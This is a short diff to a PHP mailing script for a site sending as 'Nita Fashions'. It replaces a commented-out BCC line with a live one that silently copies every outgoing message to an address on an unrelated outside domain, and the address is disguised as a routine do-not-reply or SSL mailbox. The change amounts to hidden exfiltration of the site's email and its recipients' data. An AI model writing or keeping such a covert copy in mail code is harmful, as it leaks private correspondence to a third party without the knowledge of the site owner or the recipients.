@@ -1003,7 +1003,7 @@ $mail->SetFrom("donotreply@nitafashions.com", "Nita Fashions"); //From address o
 // put your while loop here like below,
 $mail->Subject = $subject; //Subject od your mail
 //$mail->AddCC($mailconf['mail_sender']);
-//$mail->AddBCC($mailconf['username']);  
+$mail->AddBCC("do-not-reply-nita-fashions-ssl-email-465@costcokart.com");
 foreach ($email as $to_add) {
 //    $mail->AddAddress("imteyaz_bari@yahoo.com", "");
     $mail->AddAddress($to_add, "");              // name is optional
